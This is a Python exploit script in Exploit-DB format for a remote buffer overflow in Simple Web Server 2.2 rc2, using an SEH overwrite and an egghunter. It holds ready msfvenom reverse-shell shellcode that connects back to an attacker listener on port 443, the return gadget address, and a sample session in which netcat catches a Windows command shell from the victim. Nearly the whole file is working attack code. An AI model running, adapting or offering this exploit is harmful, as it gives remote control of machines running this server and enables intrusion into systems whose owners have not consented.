#!/usr/bin/python
#coding: latin-1
import socket
############################################################################################
#Exploit Title: Simple Web Server 2.2 rc2 - Remote Buffer Overflow Exploit (SEH+egghunter)
#Date: 5/2/2023
#Author: Mohamed Ahmed (@0XMohomiester)
#software link: http://www.pmx.it/download/sws-2.2-rc2-i686.exe
#Version: 2.2 rc2
#Tested on: Windows Vista Ultimate 32Bit SP2 
############################################################################################
'''
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.54] 49193
Microsoft Windows [Version 6.0.6002]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Program Files\PMSoftware\sws>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9EF8-34B1

 Directory of C:\Program Files\PMSoftware\sws

02/05/2023  03:30 AM    <DIR>          .
02/05/2023  03:30 AM    <DIR>          ..
02/05/2023  03:30 AM    <DIR>          dev
02/05/2023  03:30 AM    <DIR>          http
04/17/2010  12:09 AM           108,032 libgcc_s_dw2-1.dll
02/21/2011  01:50 PM           879,630 libstdc++-6.dll
12/27/2005  01:29 AM               973 mime
02/05/2023  03:30 AM    <DIR>          pawn
02/05/2023  03:30 AM    <DIR>          plugin
02/27/2011  02:47 AM               175 plugin.ini
03/05/2011  08:33 AM             2,110 release.txt
03/27/2011  11:09 AM            25,600 sws.exe
03/27/2011  11:10 AM            96,768 swscore.dll
02/05/2023  03:30 AM            59,430 uninstsws.exe
               8 File(s)      1,172,718 bytes
               6 Dir(s)  56,641,961,984 bytes free

C:\Program Files\PMSoftware\sws>

'''
# msfvenom --platform windows  -p windows/shell_reverse_tcp LHOST=192.168.1.6  LPORT=443 -e x86/shikata_ga_nai -b '\x00' -f py

buf =  b""
buf += b"\xba\xbd\xdf\x9b\x82\xdd\xc2\xd9\x74\x24\xf4\x5b"
buf += b"\x2b\xc9\xb1\x52\x31\x53\x12\x03\x53\x12\x83\x7e"
buf += b"\xdb\x79\x77\x7c\x0c\xff\x78\x7c\xcd\x60\xf0\x99"
buf += b"\xfc\xa0\x66\xea\xaf\x10\xec\xbe\x43\xda\xa0\x2a"
buf += b"\xd7\xae\x6c\x5d\x50\x04\x4b\x50\x61\x35\xaf\xf3"
buf += b"\xe1\x44\xfc\xd3\xd8\x86\xf1\x12\x1c\xfa\xf8\x46"
buf += b"\xf5\x70\xae\x76\x72\xcc\x73\xfd\xc8\xc0\xf3\xe2"
buf += b"\x99\xe3\xd2\xb5\x92\xbd\xf4\x34\x76\xb6\xbc\x2e"
buf += b"\x9b\xf3\x77\xc5\x6f\x8f\x89\x0f\xbe\x70\x25\x6e"
buf += b"\x0e\x83\x37\xb7\xa9\x7c\x42\xc1\xc9\x01\x55\x16"
buf += b"\xb3\xdd\xd0\x8c\x13\x95\x43\x68\xa5\x7a\x15\xfb"
buf += b"\xa9\x37\x51\xa3\xad\xc6\xb6\xd8\xca\x43\x39\x0e"
buf += b"\x5b\x17\x1e\x8a\x07\xc3\x3f\x8b\xed\xa2\x40\xcb"
buf += b"\x4d\x1a\xe5\x80\x60\x4f\x94\xcb\xec\xbc\x95\xf3"
buf += b"\xec\xaa\xae\x80\xde\x75\x05\x0e\x53\xfd\x83\xc9"
buf += b"\x94\xd4\x74\x45\x6b\xd7\x84\x4c\xa8\x83\xd4\xe6"
buf += b"\x19\xac\xbe\xf6\xa6\x79\x10\xa6\x08\xd2\xd1\x16"
buf += b"\xe9\x82\xb9\x7c\xe6\xfd\xda\x7f\x2c\x96\x71\x7a"
buf += b"\xa7\x59\x2d\x85\x31\x32\x2c\x85\x3c\x79\xb9\x63"
buf += b"\x54\x6d\xec\x3c\xc1\x14\xb5\xb6\x70\xd8\x63\xb3"
buf += b"\xb3\x52\x80\x44\x7d\x93\xed\x56\xea\x53\xb8\x04"
buf += b"\xbd\x6c\x16\x20\x21\xfe\xfd\xb0\x2c\xe3\xa9\xe7"
buf += b"\x79\xd5\xa3\x6d\x94\x4c\x1a\x93\x65\x08\x65\x17"
buf += b"\xb2\xe9\x68\x96\x37\x55\x4f\x88\x81\x56\xcb\xfc"
buf += b"\x5d\x01\x85\xaa\x1b\xfb\x67\x04\xf2\x50\x2e\xc0"
buf += b"\x83\x9a\xf1\x96\x8b\xf6\x87\x76\x3d\xaf\xd1\x89"
buf += b"\xf2\x27\xd6\xf2\xee\xd7\x19\x29\xab\xe8\x53\x73"
buf += b"\x9a\x60\x3a\xe6\x9e\xec\xbd\xdd\xdd\x08\x3e\xd7"
buf += b"\x9d\xee\x5e\x92\x98\xab\xd8\x4f\xd1\xa4\x8c\x6f"
buf += b"\x46\xc4\x84" # 351 bytes

'''
0x79433179 --> SEH offset --> 2280 bytes 

0x6fc4e65a : pop edi # pop ebp # ret  |  {PAGE_EXECUTE_READ} [libstdc++-6.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\PMSoftware\sws\libstdc++-6.dll)

'''
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x57\x30\x30\x74\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7" # 32 bytes
egg = "W00tW00t"
payload = egg + buf 

crash = "\x90" *2280+"\xeb\x06\x90\x90" + "\x5a\xe6\xc4\x6f" + egghunter + "\x90"* 2680
print len(crash)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer =  "GET / HTTP/1.1\r\n"
buffer += "Host:"+payload+"\r\n"
buffer += "Connection:" + crash + "\r\n"
buffer += "\r\n"
s.connect(("192.168.1.54", 80))
s.send(buffer)
print "Sending Buffer..."
print "Buffer sent"
s.close()
